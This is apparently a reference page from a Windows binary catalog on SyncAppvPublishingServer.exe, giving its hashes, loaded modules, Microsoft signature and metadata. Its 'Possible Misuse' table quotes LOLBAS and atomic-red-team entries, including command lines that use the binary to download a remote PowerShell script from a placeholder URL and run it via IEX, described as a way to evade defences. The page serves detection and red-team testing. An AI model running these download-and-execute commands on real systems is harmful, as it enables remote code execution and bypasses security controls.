---
title: SyncAppvPublishingServer.exe | Microsoft Application Virtualization Sync Utility
excerpt: What is SyncAppvPublishingServer.exe?
---

# SyncAppvPublishingServer.exe 

* File Path: `C:\Windows\system32\SyncAppvPublishingServer.exe`
* Description: Microsoft Application Virtualization Sync Utility

## Hashes

Type | Hash
-- | --
MD5 | `273E3930B139A5ED04EBDE30DC972A8D`
SHA1 | `8A3B54DA7F86981F2E0D9AB73E8D27DBA730C71D`
SHA256 | `92D0CC0C047C2ACA0941F4E99B35BDD52B9A2FAE1BA3216CAD3DDEEB36E3161A`
SHA384 | `2C086C00111B50AEE73D6E0300D8782D8FACB1A0E6D1140D9F84F3C80657D994A53D85E675425233366D0B280E656C56`
SHA512 | `06A21CB3F9781BBB63E4E9EE3BBED2949DE1BD4E50DB64D8D8F44EF92405ABAF2DED1E7F689167FB6EDF04B789389428196ED5B1E4AF920C3F5653F5896D4528`
SSDEEP | `768:B6Fyyphi89jr4jwmp3PwyDdwiBieSWaZxZEApqiNwGr6wD1PqVC:B6V9jrN8P3DviCa5EgnG4PqVC`

## Runtime Data

### Loaded Modules:

Path |
-- |
C:\Windows\System32\combase.dll |
C:\Windows\System32\GDI32.dll |
C:\Windows\System32\gdi32full.dll |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\System32\msvcp_win.dll |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\System32\ole32.dll |
C:\Windows\System32\RPCRT4.dll |
C:\Windows\System32\SHELL32.dll |
C:\Windows\system32\SyncAppvPublishingServer.exe |
C:\Windows\System32\ucrtbase.dll |
C:\Windows\System32\USER32.dll |
C:\Windows\System32\win32u.dll |


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: syncappvpublishingserver.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.19041.264 (WinBuild.160101.0800)
* Product Version: 10.0.19041.264
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\system32\SyncAppvPublishingServer.exe](SyncAppvPublishingServer.exe-104C4F47F750B2C312EF9258C59A86E7.md) | 88

## Possible Misuse

*The following table contains possible examples of `SyncAppvPublishingServer.exe` being misused. While `SyncAppvPublishingServer.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `Name: SyncAppvPublishingServer.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `Usecase: Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- Path: C:\Windows\System32\SyncAppvPublishingServer.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- Path: C:\Windows\SysWOW64\SyncAppvPublishingServer.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml) | `- IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `Name: Syncappvpublishingserver.vbs`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `- Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syncappvpublishingserver.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | `- Path: C:\Windows\System32\SyncAppvPublishingServer.vbs`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #2: SyncAppvPublishingServer - Execute arbitrary PowerShell code [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #1: SyncAppvPublishingServer Signed Script PowerShell Command Execution [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #2: SyncAppvPublishingServer - Execute arbitrary PowerShell code [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #1: SyncAppvPublishingServer Signed Script PowerShell Command Execution [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | - [Atomic Test #1 - SyncAppvPublishingServer Signed Script PowerShell Command Execution](#atomic-test-1---syncappvpublishingserver-signed-script-powershell-command-execution) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | ## Atomic Test #1 - SyncAppvPublishingServer Signed Script PowerShell Command Execution | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | - [Atomic Test #2 - SyncAppvPublishingServer - Execute arbitrary PowerShell code](#atomic-test-2---syncappvpublishingserver---execute-arbitrary-powershell-code) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | ## Atomic Test #2 - SyncAppvPublishingServer - Execute arbitrary PowerShell code | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe. Requires Windows 10. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md) | SyncAppvPublishingServer.exe "n; #{powershell_code}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


